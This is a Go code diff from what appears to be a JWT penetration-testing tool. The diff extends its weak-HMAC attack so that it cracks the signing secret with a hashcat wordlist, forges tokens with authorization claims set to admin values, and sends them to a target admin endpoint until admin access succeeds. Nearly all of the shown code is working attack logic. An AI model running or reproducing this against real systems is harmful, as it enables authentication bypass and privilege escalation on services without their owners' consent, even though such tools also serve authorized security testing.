@@ -8,7 +8,9 @@ import (
 
 	"github.com/golang-jwt/jwt/v5"
 
+	hmacutil "github.com/spencer5cent/jwtknife/internal/hmac"
 	"github.com/spencer5cent/jwtknife/internal/httpx"
+	"github.com/spencer5cent/jwtknife/internal/jwtknifejwt"
 	"github.com/spencer5cent/jwtknife/internal/report"
 )
 
@@ -29,12 +31,28 @@ func (weakHMAC) Run(in AttackInput) report.AttackResult {
 		return ar
 	}
 
-	fmt.Println("This JWT uses", in.ParsedJWT.Alg)
-	fmt.Print("If you already know or suspect the HMAC secret, enter it now (or press Enter to skip): ")
+	secret := strings.TrimSpace(string(in.HMACSecret))
+	if secret == "" && in.AllowResign {
+		fmt.Println("This JWT uses", in.ParsedJWT.Alg)
+		fmt.Print("If you already know or suspect the HMAC secret, enter it now (or press Enter to skip): ")
 
-	rd := bufio.NewReader(os.Stdin)
-	secret, _ := rd.ReadString('\n')
-	secret = strings.TrimSpace(secret)
+		rd := bufio.NewReader(os.Stdin)
+		line, _ := rd.ReadString('\n')
+		secret = strings.TrimSpace(line)
+	}
+
+	if secret == "" {
+		if strings.TrimSpace(in.HMACWordlist) != "" {
+			recovered, err := hmacutil.RecoverSecret(in.RawJWT, in.ParsedJWT.Alg, strings.TrimSpace(in.HMACWordlist))
+			if err == nil {
+				secret = recovered
+				ar.Notes["recovered_secret"] = recovered
+				ar.Note = "HMAC secret recovered with hashcat wordlist"
+			} else {
+				ar.Errors = append(ar.Errors, err.Error())
+			}
+		}
+	}
 
 	if secret == "" {
 		ar.Outcome = report.OutcomeNoEffect
@@ -42,43 +60,96 @@ func (weakHMAC) Run(in AttackInput) report.AttackResult {
 		return ar
 	}
 
-	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
-		"sub": "administrator",
-	})
-
-	signed, err := token.SignedString([]byte(secret))
+	method, err := signingMethodForAlg(in.ParsedJWT.Alg)
 	if err != nil {
 		ar.Outcome = report.OutcomeError
 		ar.Errors = append(ar.Errors, err.Error())
 		return ar
 	}
 
-	r := in.Client.Do(httpx.RequestPlan{
-		Label:     "atk-weak-hmac",
-		URL:       in.Targets.AdminURL,
-		Method:    "GET",
-		JWT:       signed,
-		Placement: in.Targets.Placement,
-	})
+	candidateClaims := claimsToMutate(in.ParsedJWT)
+	for _, claim := range candidateClaims {
+		for _, val := range commonAdminValues {
+			p, err := jwtknifejwt.Parse(in.RawJWT)
+			if err != nil {
+				ar.Outcome = report.OutcomeError
+				ar.Errors = append(ar.Errors, err.Error())
+				return ar
+			}
 
-	ar.Steps = append(ar.Steps, report.Step{
-		Label:   "re-signed-hmac",
-		Details: "signed with provided secret, sub=administrator",
-		HTTP:    report.FromHTTPResult(r),
-		JWT:     report.JWTInfo{Token: signed},
-	})
+			if p.Payload == nil {
+				p.Payload = map[string]any{}
+			}
+			p.Payload[claim] = val
 
-	if report.IsAdminSuccess(in.Baseline, ar.Steps[0].HTTP) {
-		ar.Outcome = report.OutcomeSuccess
-		ar.Note = "admin access achieved with weak HMAC secret"
-		return ar
+			token := jwt.NewWithClaims(method, jwt.MapClaims(p.Payload))
+			for k, headerVal := range p.Header {
+				token.Header[k] = headerVal
+			}
+			token.Header["alg"] = method.Alg()
+
+			signed, err := token.SignedString([]byte(secret))
+			if err != nil {
+				ar.Errors = append(ar.Errors, err.Error())
+				continue
+			}
+
+			r := in.Client.Do(httpx.RequestPlan{
+				Label:     "atk-weak-hmac",
+				URL:       in.Targets.AdminURL,
+				Method:    in.Targets.Method,
+				JWT:       signed,
+				Placement: in.Targets.Placement,
+			})
+
+			step := report.Step{
+				Label:   "re-signed-hmac",
+				Details: "signed with provided secret, " + claim + "=" + val,
+				HTTP:    report.FromHTTPResult(r),
+				JWT:     report.JWTInfo{Token: signed},
+			}
+			ar.Steps = append(ar.Steps, step)
+
+			if report.IsAdminSuccess(in.Baseline, step.HTTP) {
+				ar.Outcome = report.OutcomeSuccess
+				ar.Note = "admin access achieved with weak HMAC secret"
+				return ar
+			}
+
+			if report.IsInteresting(in.Baseline, step.HTTP) {
+				ar.Outcome = report.OutcomeInteresting
+			}
+		}
 	}
 
-	if report.IsInteresting(in.Baseline, ar.Steps[0].HTTP) {
-		ar.Outcome = report.OutcomeInteresting
-		return ar
+	if ar.Outcome == "" {
+		ar.Outcome = report.OutcomeNoEffect
 	}
-
-	ar.Outcome = report.OutcomeNoEffect
 	return ar
+}
+
+func signingMethodForAlg(alg string) (jwt.SigningMethod, error) {
+	switch strings.ToUpper(strings.TrimSpace(alg)) {
+	case "HS256":
+		return jwt.SigningMethodHS256, nil
+	case "HS384":
+		return jwt.SigningMethodHS384, nil
+	case "HS512":
+		return jwt.SigningMethodHS512, nil
+	default:
+		return nil, fmt.Errorf("unsupported HMAC algorithm %q", alg)
+	}
+}
+
+func claimsToMutate(parsed *jwtknifejwt.Parsed) []string {
+	var claims []string
+	for _, claim := range authClaims {
+		if _, ok := parsed.Payload[claim]; ok {
+			claims = append(claims, claim)
+		}
+	}
+	if len(claims) == 0 {
+		return []string{"sub"}
+	}
+	return claims
 }
